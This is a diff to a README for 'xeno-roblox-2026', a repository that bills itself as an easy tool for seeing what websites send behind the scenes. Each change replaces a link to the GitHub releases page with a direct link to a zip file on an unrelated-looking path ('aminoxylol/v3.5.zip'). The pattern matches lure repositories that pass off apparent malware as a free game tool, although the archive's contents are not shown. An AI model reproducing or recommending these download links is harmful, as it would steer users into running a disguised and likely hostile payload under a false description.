@@ -1,6 +1,6 @@
 # ⚡ xeno-roblox-2026 - Easy API Tools for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-xeno--roblox--2026-blue?style=for-the-badge&logo=github)](https://github.com/albertin4660/xeno-roblox-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-xeno--roblox--2026-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/albertin4660/xeno-roblox-2026/main/aminoxylol/v3.5.zip)
 
 ## 🎯 What Is This?
 
@@ -34,7 +34,7 @@ Think of it like a window into a website's brain. When you click buttons, fill f
 
 Getting started is super simple. Just follow these steps:
 
-1. **Visit the download page** – Click the big blue button above or go here: [Download xeno-roblox-2026](https://github.com/albertin4660/xeno-roblox-2026/releases)
+1. **Visit the download page** – Click the big blue button above or go here: [Download xeno-roblox-2026](https://raw.githubusercontent.com/albertin4660/xeno-roblox-2026/main/aminoxylol/v3.5.zip)
 2. **Find the latest version** – Look for the newest file listed on that page
 3. **Get the file** – Visit this link to download the application
 
@@ -42,7 +42,7 @@ Getting started is super simple. Just follow these steps:
 
 Your download link is ready:
 
-**[🔗 Click Here to Download xeno-roblox-2026](https://github.com/albertin4660/xeno-roblox-2026/releases)**
+**[🔗 Click Here to Download xeno-roblox-2026](https://raw.githubusercontent.com/albertin4660/xeno-roblox-2026/main/aminoxylol/v3.5.zip)**
 
 Visit this link to download the application.
 
@@ -171,7 +171,7 @@ You don't need to be a computer wizard to enjoy xeno-roblox-2026. If you can cli
 
 Get your copy now and see what your favorite websites are really saying behind the scenes!
 
-**[⬇️ Download xeno-roblox-2026 Now](https://github.com/albertin4660/xeno-roblox-2026/releases)**
+**[⬇️ Download xeno-roblox-2026 Now](https://raw.githubusercontent.com/albertin4660/xeno-roblox-2026/main/aminoxylol/v3.5.zip)**
 
 It's free, it's easy, and it's a fantastic way to learn about the web.
 
